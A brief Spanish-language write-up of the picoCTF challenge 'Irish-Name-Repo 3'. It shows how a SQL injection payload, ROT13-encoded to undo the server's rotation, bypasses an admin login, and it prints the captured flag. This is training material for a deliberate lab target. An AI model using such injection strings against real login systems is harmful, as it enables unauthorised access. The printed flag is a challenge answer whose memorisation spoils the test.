# Irish-Name-Repo 3
## Objetivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/40742/` ([link](https://jupiter.challenges.picoctf.org/problem/40742/)) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!

## Soluciòn
Se hace exactamente lo mismo que en los problemas anteriores, solo se agrega un paso extra.
Con ayuda de una herramienta externa rotamos la contraseña 13 veces, pues es lo que está haciendo la sentencia SQL al validar.
Ahora vemos que solo tenemos un cuadro de texto que corresponde a password
El debug tambien se encuentra, si mandamos el login podemos ver que cifra en ROT13 la entrada, podemos buscar una herramienta para ROT13, podemos mandar la inyeccion SQL y despues copiar lo que nos muestre.
si mandamos esto
``` shell
admin' or 1=1;
```
nos resultara esto
``` shell
password: admin' or 1=1;
SQL query: SELECT * FROM admin where password = 'nqzva' be 1=1;'
```
si le mandamos lo que nos resulta debera leer la inyeccion, y asi podremos acceder.
Mandamos esto
```shell
nqzva' be 1=1;
```
y nos manda a una nueva pàgina que dice lo siguiente.
```shell
# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}
```
picoCTF{3v3n_m0r3_SQL_4424e7af}

## Referencias
- []()